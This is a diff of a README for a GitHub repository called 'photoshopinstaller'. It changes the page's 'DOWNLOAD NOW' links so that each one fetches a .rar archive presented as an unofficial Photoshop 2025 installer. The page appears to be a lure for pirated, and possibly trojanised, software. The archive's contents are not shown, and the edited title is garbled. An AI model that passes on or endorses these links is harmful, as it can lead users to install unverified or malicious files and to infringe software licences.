@@ -1,5 +1,5 @@
 # photoshopinstaller
-Установщик Photoshop 2025 | Photoshop Installer 2025
+hotoshop Installer 2025 | Yстановщик Photoshop 2025
 
 <!-- Баннер сверху -->
 <p align="center">
@@ -10,7 +10,7 @@
 
 [DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/download/photoshop/AdobePhotoshopInstaller.rar)
 -
-[DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/tag/photoshop)
+[DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/download/photoshop/AdobePhotoshopInstaller.rar)
 -
-[DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/tag/photoshop)
+[DOWNLOAD NOW](https://github.com/SOFTONIAX/photoshopinstaller/releases/download/photoshop/AdobePhotoshopInstaller.rar)
 ---
